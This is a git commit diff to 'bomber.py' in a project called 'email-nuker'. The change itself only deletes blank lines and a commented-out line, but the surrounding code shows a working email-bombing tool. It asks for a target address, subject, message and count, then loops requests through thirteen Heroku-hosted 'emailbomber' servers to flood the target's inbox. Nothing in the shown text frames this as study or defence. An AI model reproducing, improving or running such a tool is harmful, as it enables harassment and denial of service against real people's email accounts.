f6e1f6ab6ed0a4c1274d3c2cb89955bd743ba69a
bagarrattaa <apple.macos.ios.6@gmail.com>
2022-03-26 11:25:34 +0530

    update bomber.py

--- bomber.py
+++ bomber.py
@@ -5,7 +5,6 @@ import time
 os.system("bash wake.sh &")
 time.sleep(2)
 os.system("clear")
-
 print("\n")
 print ("email-nuker version: 1.0.2")
 print ("github: https://github.com/bagarrattaa/email-nuker ")
@@ -19,10 +18,7 @@ msg=msg.replace(" ","%20")
 sub=sub.replace(" ","%20")
 srvrlist={1:"https://emailbomber-1.herokuapp.com",2:"https://emailbomber-2.herokuapp.com",3:"https://emailbomber-3.herokuapp.com",4:"https://emailbomber-4.herokuapp.com",5:"https://emailbomber-5.herokuapp.com",6:"https://emailbomber-6.herokuapp.com",7:"https://emailbomber-7.herokuapp.com",8:"https://emailbomber-8.herokuapp.com",9:"https://emailbomber-9.herokuapp.com",10:"https://emailbomber-10.herokuapp.com",11:"https://emailbomber-11.herokuapp.com",12:"https://emailbomber-12.herokuapp.com",13:"https://emailbomber-13.herokuapp.com"}
 am=int(input("enter amount of msgs to send "))
-
-
 for i in range(0,am): 
-    # os.system("clear")
     srvr=random.randint(1,13)
     req=requests.get(srvrlist.get(srvr)+"/bomb/"+to+"/"+sub+"/"+msg)
     if req.text=="Sent": 
